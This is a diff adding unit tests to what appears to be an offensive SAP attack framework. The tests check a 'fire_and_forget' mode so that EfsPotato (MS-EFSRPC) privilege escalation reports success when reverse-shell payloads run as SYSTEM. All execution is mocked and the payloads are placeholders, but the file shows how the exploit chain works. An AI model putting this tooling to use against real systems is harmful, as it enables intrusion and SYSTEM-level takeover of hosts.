@@ -974,3 +974,232 @@ def test_run_windows_lpe_failure_adapter_preserves_error():
     assert adapted["success"] is False
     assert "No working Windows LPE" in adapted["error"]
     assert adapted["winlpe_method"] == ""
+
+
+# ===========================================================================
+# fire_and_forget mode — shell-deployment payloads write to a socket
+# ===========================================================================
+# Operator-reported regression (SJJ): EfsPotato successfully spawned the
+# SYSTEM child for the reverse/bind shell payload (lsarpc/samr/netlogon
+# all printed "[!] process with pid: NNNN created."), but the existing
+# stdout-based success criterion required non-empty post-separator
+# stdout — which a shell payload never produces because it writes to a
+# network socket, not stdout.  fire_and_forget mode flips the criterion
+# to "spawn signal present" so the runner correctly reports SUCCESS as
+# soon as EfsPotato confirms CreateProcessAsUser landed.
+
+
+# Canonical EfsPotato banner.  Reproduced verbatim from the SJJ lab
+# capture so future regressions can be debugged against a real sample.
+# Note the lower-case "process" — EfsPotato logs it in lower-case in
+# the version we vendor.
+_EFSPOTATO_BANNER_SPAWNED = (
+    "EfsPotato by zcgonvh - exploit MS-EFSRPC for LPE\r\n"
+    "[+] Current user: NT AUTHORITY\\NETWORK SERVICE\r\n"
+    "[+] Pipe: lsarpc\r\n"
+    "[+] Get Token\r\n"
+    "[!] process with pid: 9872 created.\r\n"
+    "==============================\r\n"
+)
+
+# Same banner but coercion failed (no "process created" line, no
+# separator).  Used to confirm fire_and_forget correctly rejects
+# pipes where no SYSTEM child spawned.
+_EFSPOTATO_BANNER_FAILED = (
+    "EfsPotato by zcgonvh - exploit MS-EFSRPC for LPE\r\n"
+    "[+] Current user: NT AUTHORITY\\NETWORK SERVICE\r\n"
+    "[+] Pipe: lsarpc\r\n"
+    "[x] EfsRpcEncryptFileSrv failed: 0x000006d9 - "
+    "EPT_S_NOT_REGISTERED\r\n"
+)
+
+
+def _make_fake_gw_for_efspotato(efspotato_banner_by_pipe):
+    """Build a fake gateway callable for run_as_system.
+
+    Returns a callable matching the (stdout, ok) shape that _make_exec
+    hands out, plus a chunk_size + label triple consumable as the full
+    _make_exec return value.
+
+    ``efspotato_banner_by_pipe`` maps pipe name -> banner string the
+    EfsPotato exe should "print" for that pipe.  Any pipe missing from
+    the dict gets an empty banner (simulates that pipe failing).
+    """
+    from sapmap_efspotato import _TARGET_EXE
+
+    def _fake_gw(prog, params="", lp=""):
+        # EfsPotato call: prog == _TARGET_EXE, params == '"<inner>" <pipe>'
+        if prog == _TARGET_EXE:
+            pipe = params.rsplit(" ", 1)[-1].strip()
+            return efspotato_banner_by_pipe.get(pipe, ""), True
+        # All other commands (cleanup, chunked upload, certutil decode,
+        # SHA hashfile probe) succeed silently.  SHA verification skips
+        # when sha_out is empty (no 64-hex-char line found).
+        return "", True
+    return _fake_gw
+
+
+def test_fire_and_forget_succeeds_when_spawn_signal_present_but_no_stdout():
+    """The SJJ regression: EfsPotato landed CreateProcessAsUser
+    (banner shows "[!] process with pid: 9872 created."), but the
+    operator command is a reverse-shell PowerShell that writes to a
+    network socket — so EfsPotato's post-separator stdout is empty.
+
+    fire_and_forget=True must report ok=True regardless of empty
+    captured stdout, citing the spawned PID."""
+    from sapmap_efspotato import run_as_system
+
+    fake_gw = _make_fake_gw_for_efspotato({
+        "lsarpc": _EFSPOTATO_BANNER_SPAWNED,
+    })
+
+    with patch("sapmap_efspotato._load_blob", return_value={
+            "hex": "00", "size": 1,
+            "sha256": "a" * 64,   # bogus but fine — SHA probe returns empty
+            }), \
+         patch("sapmap_efspotato._make_exec",
+                 return_value=(fake_gw, 100, "gw_sapxpg")):
+        out = run_as_system(_node(), "powershell -enc ...",
+                              fire_and_forget=True)
+
+    assert out["ok"] is True, out
+    # PID extracted from the banner and surfaced in the stdout summary
+    # so the operator sees which SYSTEM child got spawned.
+    assert "9872" in out["stdout"]
+    assert "fire-and-forget" in out["stdout"].lower()
+    # The pipe that won is recorded in details for engagement reporting.
+    assert out["details"]["succeeded_pipe"] == "lsarpc"
+
+
+def test_fire_and_forget_false_fails_when_post_separator_stdout_empty():
+    """Same banner (spawn happened, no stdout) but default mode —
+    must fail.  This locks in the asymmetry between the two modes so
+    the OS Terminal path (which legitimately requires captured
+    stdout) doesn't silently start reporting success when the SYSTEM
+    child crashed before printing anything."""
+    from sapmap_efspotato import run_as_system
+
+    # ALL pipes produce the spawn signal but no post-separator stdout.
+    # In normal mode this must surface as "None of the EFSRPC pipes
+    # succeeded" — the operator's command produced no output, which in
+    # OS-terminal context is a failure (operator expects whoami /
+    # ipconfig / etc output).
+    fake_gw = _make_fake_gw_for_efspotato({
+        pipe: _EFSPOTATO_BANNER_SPAWNED
+        for pipe in ("lsarpc", "efsrpc", "samr", "netlogon")
+    })
+
+    with patch("sapmap_efspotato._load_blob", return_value={
+            "hex": "00", "size": 1, "sha256": "a" * 64}), \
+         patch("sapmap_efspotato._make_exec",
+                 return_value=(fake_gw, 100, "gw_sapxpg")):
+        out = run_as_system(_node(), "whoami")   # fire_and_forget default=False
+
+    assert out["ok"] is False, out
+    assert "None of the EFSRPC pipes succeeded" in out["error"]
+
+
+def test_fire_and_forget_falls_through_pipes_until_spawn_signal():
+    """First two pipes produced no "process created" line (coercion
+    failed); third pipe succeeded.  fire_and_forget must iterate
+    through pipes and stop at the first one with a spawn signal."""
+    from sapmap_efspotato import run_as_system
+
+    fake_gw = _make_fake_gw_for_efspotato({
+        "lsarpc":   _EFSPOTATO_BANNER_FAILED,
+        "efsrpc":   _EFSPOTATO_BANNER_FAILED,
+        "samr":     _EFSPOTATO_BANNER_SPAWNED,    # finally spawns
+        # netlogon intentionally absent — must not be tried since samr won
+    })
+
+    with patch("sapmap_efspotato._load_blob", return_value={
+            "hex": "00", "size": 1, "sha256": "a" * 64}), \
+         patch("sapmap_efspotato._make_exec",
+                 return_value=(fake_gw, 100, "gw_sapxpg")):
+        out = run_as_system(_node(), "powershell -enc ...",
+                              fire_and_forget=True)
+
+    assert out["ok"] is True, out
+    assert out["details"]["succeeded_pipe"] == "samr"
+    # Three pipes attempted (lsarpc fail, efsrpc fail, samr win).
+    # netlogon never tried.
+    tried_pipes = [p["pipe"] for p in out["details"]["pipes_tried"]]
+    assert tried_pipes == ["lsarpc", "efsrpc", "samr"]
+
+
+def test_run_windows_lpe_forwards_fire_and_forget_to_efspotato():
+    """The reverse/bind shell handler in sapmap_gui.py calls
+    run_windows_lpe(node, full_cmd, fire_and_forget=True).  Lock the
+    forwarding so a future refactor doesn't silently drop the flag —
+    that's exactly the regression we just fixed (shells reported
+    failure because the flag wasn't reaching EfsPotato)."""
+    from sapmap_winlpe_auto import run_windows_lpe
+
+    captured_kwargs = {}
+
+    def _fake_run_as_system(node, command, timeout=90.0,
+                              fire_and_forget=False):
+        captured_kwargs["fire_and_forget"] = fire_and_forget
+        captured_kwargs["command"] = command
+        return {"ok": True, "stdout": "[fire-and-forget] pid=9872",
+                "error": ""}
+
+    n = _node()
+    with patch("sapmap_efspotato.check_efspotato", return_value={
+            "vulnerable": True, "os_build": "10.0.14393",
+            "has_impersonate": True, "blob_available": True,
+            "reason": "OK", "details": {}}), \
+         patch("sapmap_godpotato.check_godpotato", return_value={
+            "vulnerable": False, "os_build": "10.0.14393",
+            "has_impersonate": True, "blob_available": True,
+            "reason": "x", "details": {}}), \
+         patch("sapmap_miniplasma.check_miniplasma", return_value={
+            "vulnerable": False, "os_build": "10.0.14393",
+            "has_cldflt": False, "net_version": "",
+            "blob_available": True, "reason": "x", "details": {}}), \
+         patch("sapmap_efspotato.run_as_system",
+                 side_effect=_fake_run_as_system):
+        out = run_windows_lpe(n, "powershell -enc shellpayload",
+                                fire_and_forget=True)
+
+    assert out["ok"] is True
+    assert out["method"] == "efspotato"
+    # The flag MUST reach EfsPotato verbatim.
+    assert captured_kwargs["fire_and_forget"] is True
+    assert captured_kwargs["command"] == "powershell -enc shellpayload"
+
+
+def test_run_windows_lpe_default_fire_and_forget_is_false():
+    """OS Command Terminal calls run_windows_lpe WITHOUT the
+    fire_and_forget kwarg — the operator expects captured stdout so
+    they can see `whoami` returning `nt authority\\system`.  Default
+    must be False so the existing OS Terminal behaviour is preserved.
+    """
+    from sapmap_winlpe_auto import run_windows_lpe
+
+    captured_kwargs = {}
+
+    def _fake_run_as_system(node, command, timeout=90.0,
+                              fire_and_forget=False):
+        captured_kwargs["fire_and_forget"] = fire_and_forget
+        return {"ok": True, "stdout": "nt authority\\system", "error": ""}
+
+    n = _node()
+    with patch("sapmap_efspotato.check_efspotato", return_value={
+            "vulnerable": True, "os_build": "10.0.14393",
+            "has_impersonate": True, "blob_available": True,
+            "reason": "OK", "details": {}}), \
+         patch("sapmap_godpotato.check_godpotato", return_value={
+            "vulnerable": False, "os_build": "10.0.14393",
+            "has_impersonate": True, "blob_available": True,
+            "reason": "x", "details": {}}), \
+         patch("sapmap_miniplasma.check_miniplasma", return_value={
+            "vulnerable": False, "os_build": "10.0.14393",
+            "has_cldflt": False, "net_version": "",
+            "blob_available": True, "reason": "x", "details": {}}), \
+         patch("sapmap_efspotato.run_as_system",
+                 side_effect=_fake_run_as_system):
+        out = run_windows_lpe(n, "whoami")   # NO fire_and_forget kwarg
+
+    assert out["ok"] is True
+    assert captured_kwargs["fire_and_forget"] is False
